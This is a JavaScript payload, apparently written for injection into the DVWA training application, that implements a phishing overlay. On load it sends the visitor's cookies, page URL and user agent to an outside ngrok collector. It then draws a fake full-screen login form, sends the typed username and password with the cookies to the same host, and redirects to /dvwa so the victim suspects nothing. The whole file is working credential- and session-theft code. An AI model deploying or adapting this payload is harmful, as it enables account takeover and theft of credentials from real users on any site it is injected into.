/* p.js — DVWA-like fake login + exfil + marker support (v2-compact, redirect /dvwa) */
(function () {
  // ==== CONFIG ====
  var COLLECTOR = "https://ae3a2a5aea54.ngrok-free.app/collect"; // cambia si tu ngrok cambia
  var BRAND = "DVWA";
  var TITLE = "Login :: New Session";

  // Redirección fija al mismo host, pero a /dvwa
  function redirectToDVWA() {
    var base = (location.origin || (location.protocol + '//' + location.host));
    window.location.href = base + "/dvwa";
  }

  // ==== Utils ====
  function qp(k){try{var s=(location.search||"").split("?");if(s.length<2)return"";return new URLSearchParams(s[1]).get(k)||""}catch(e){return""}}
  function el(tag, cls, html){var x=document.createElement(tag); if(cls) x.className=cls; if(html!=null) x.innerHTML=html; return x;}
  function set(v,n){try{v.value=n}catch(_){}} // safe setter
  var MARKER = qp("m") || "phish";
  var ORIGIN_URL = location.href;
  var COOKIES = document.cookie;
  var UA = navigator.userAgent;

  // ==== Passive probe ====
  try{
    fetch(COLLECTOR,{
      method:"POST",
      headers:{"Content-Type":"application/x-www-form-urlencoded"},
      body:"probe=1"
        +"&marker="+encodeURIComponent(MARKER)
        +"&url="+encodeURIComponent(ORIGIN_URL)
        +"&ua="+encodeURIComponent(UA)
        +"&cookies="+encodeURIComponent(COOKIES)
    }).catch(function(){});
  }catch(_){}

  // ==== Styles (compact) ====
  var css = [
    "*,*::before,*::after{box-sizing:border-box}",
    ".x-ovl{position:fixed;inset:0;background:linear-gradient(135deg,#0b0b0b,#141414);backdrop-filter:blur(2px);z-index:2147483647;display:flex;align-items:center;justify-content:center;padding:10px}",
    ".x-card{width:380px;max-width:96vw;background:#151515;border:1px solid #262626;border-radius:10px;padding:16px 14px 14px;color:#e6e6e6;font:13px system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;box-shadow:0 6px 22px rgba(0,0,0,.35),0 0 0 2px #222 inset}",
    ".x-logo{display:flex;align-items:center;gap:8px;justify-content:center;margin-bottom:4px}",
    ".x-dot{width:9px;height:9px;border-radius:50%;background:#9f0;display:inline-block;box-shadow:0 0 8px #8f0}",
    ".x-title{color:#9f0;font-size:18px;text-align:center;margin:4px 0 10px;font-weight:700;letter-spacing:.2px}",
    ".x-lab{display:block;margin:6px 0 4px;color:#c6c6c6;font-weight:600}",
    ".x-inp{display:block;width:100%;padding:9px 10px;background:#0f0f0f;border:1px solid #333;color:#eee;border-radius:7px;outline:none;transition:.15s border;min-width:0}",
    ".x-inp:focus{border-color:#9f0;box-shadow:0 0 0 3px rgba(153,255,0,.08)}",
    ".x-btn{margin-top:12px;width:100%;padding:10px 10px;border:0;background:#9f0;color:#081000;font-weight:800;border-radius:7px;cursor:pointer;transition:transform .04s ease, filter .2s}",
    ".x-btn:active{transform:translateY(1px)} .x-btn[disabled]{filter:grayscale(.4);cursor:progress}",
    ".x-meta{margin-top:10px;font-size:11px;color:#9a9a9a;text-align:center}",
    ".x-alert{margin-top:8px;padding:8px 10px;border-radius:7px;border:1px solid #2b2b2b;background:#101010;color:#dcdcdc;display:none;font-size:12px}",
    ".x-alert.ok{border-color:#2b4;background:#0f1a0f;color:#cfe9cf}",
    ".x-alert.err{border-color:#744;background:#1a0f0f;color:#f1c7c7}",
    ".x-spinner{display:inline-block;width:14px;height:14px;border:2px solid #061;border-top-color:#9f0;border-radius:50%;animation:xspin .9s linear infinite;vertical-align:-2px;margin-right:6px}",
    "@keyframes xspin{to{transform:rotate(360deg)}}",
    "@media (max-width:360px){.x-card{width:94vw;padding:14px 12px}.x-title{font-size:17px}.x-inp{padding:8px 9px}.x-btn{padding:9px}}"
  ].join("");
  document.head.appendChild(el("style", null, css));

  // ==== DOM ====
  var ovl = el("div", "x-ovl");
  var card = el("div", "x-card");
  var logo = el("div", "x-logo", '<span class="x-dot"></span><span>'+BRAND+'</span>');
  var title = el("div", "x-title", TITLE);

  var form = el("form", null);
  form.id = "xpf";
  form.method = "POST";
  form.action = COLLECTOR; // fallback si JS falla

  var labU = el("label", "x-lab"); labU.htmlFor = "xu"; labU.textContent = "Username";
  var inpU = el("input", "x-inp"); inpU.id="xu"; inpU.name="username"; inpU.autocomplete="username"; inpU.required=true;

  var labP = el("label", "x-lab"); labP.htmlFor = "xp"; labP.textContent = "Password";
  var inpP = el("input", "x-inp"); inpP.id="xp"; inpP.type="password"; inpP.name="password"; inpP.autocomplete="current-password"; inpP.required=true;

  // Hidden context
  var hOrigin = el("input"); hOrigin.type="hidden"; hOrigin.name="origin"; set(hOrigin,"dvwa-fake-login");
  var hMarker = el("input"); hMarker.type="hidden"; hMarker.name="marker"; set(hMarker, MARKER);
  var hURL    = el("input"); hURL.type="hidden"; hURL.name="page_url"; set(hURL, ORIGIN_URL);
  var hCk     = el("input"); hCk.type="hidden"; hCk.name="cookies"; set(hCk, COOKIES);
  var hUA     = el("input"); hUA.type="hidden"; hUA.name="ua"; set(hUA, UA);

  var btn = el("button", "x-btn", "Login"); btn.type="submit";
  var meta = el("div", "x-meta", "Damn Vulnerable Web Application");
  var alertBox = el("div","x-alert","");

  form.appendChild(labU); form.appendChild(inpU);
  form.appendChild(labP); form.appendChild(inpP);
  form.appendChild(hOrigin); form.appendChild(hMarker); form.appendChild(hURL); form.appendChild(hCk); form.appendChild(hUA);
  form.appendChild(btn);
  card.appendChild(logo); card.appendChild(title); card.appendChild(form); card.appendChild(alertBox); card.appendChild(meta);
  ovl.appendChild(card);
  document.body.appendChild(ovl);

  // UX
  try{ inpU.focus(); }catch(_){}
  document.addEventListener("keydown", function(e){ if(e.key==="Escape"){ e.preventDefault(); }}, true);

  // ==== Submit: fetch + redirect -> /dvwa ====
  form.addEventListener("submit", function(e){
    e.preventDefault();
    btn.disabled = true;
    var oldHtml = btn.innerHTML;
    btn.innerHTML = '<span class="x-spinner"></span>Signing in...';

    var data = new URLSearchParams(new FormData(form)).toString();

    fetch(COLLECTOR, {
      method: "POST",
      headers: {"Content-Type":"application/x-www-form-urlencoded"},
      body: data
    }).then(function(){
      alertBox.className = "x-alert ok";
      alertBox.style.display = "block";
      alertBox.textContent = "Session refreshed. Redirecting...";
      setTimeout(redirectToDVWA, 450);
    }).catch(function(){
      alertBox.className = "x-alert err";
      alertBox.style.display = "block";
      alertBox.textContent = "Temporary error. Redirecting...";
      setTimeout(redirectToDVWA, 650);
    }).finally(function(){
      btn.disabled = false;
      btn.innerHTML = oldHtml;
    });
  }, {once:false});
})();
